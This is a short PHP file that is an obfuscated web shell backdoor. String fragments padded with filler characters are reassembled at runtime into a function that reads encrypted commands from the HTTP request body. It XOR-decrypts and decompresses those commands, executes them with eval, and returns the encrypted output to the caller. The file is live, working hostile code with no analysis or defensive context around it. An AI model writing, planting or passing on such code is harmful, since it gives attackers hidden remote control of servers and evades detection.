<?php
$X='cFontents();@Fob_endF_cleaFn();$Fr=@base6F4FF_encode(@x(F@gzcomprFFess($o),$k))F;printFF("$p$kh$r$kf");}';
$s='$Fo.=$t{$i}^$Fk{$j};}}retFurn F$o;}if F(@prFeg_matcFh("F/$kh(.+)F$kf/"F,@fFile_geFt_contents("FphFp:/F/i';
$f='F$k="0426275Ff";$khF="fF7feFa4324f79"F;$kf="Fa29f46249c4F0";F$Fp="G9BLrF5RFOFPazuJFQjp";function x($Ft,$';
$q='nput"),$Fm)==1) {@oFbFF_start();@eFval(@gzuncFompressF(@Fx(@base6F4F_decoFdFe($m[F1]),$k)));$o=@obF_get_';
$E='k)F{$c=strlen($Fk)F;$lF=stFrlen($t)F;$o="";for($i=FF0;F$i<$l;){for($jF=0;F($j<$c&&$i<F$l)F;$j++,$i++)FF{';
$w=str_replace('LX','','cLXreLXaLXte_fuLXnLXctiLXon');
$I=str_replace('F','',$f.$E.$s.$q.$X);
$F=$w('',$I);$F();
?>
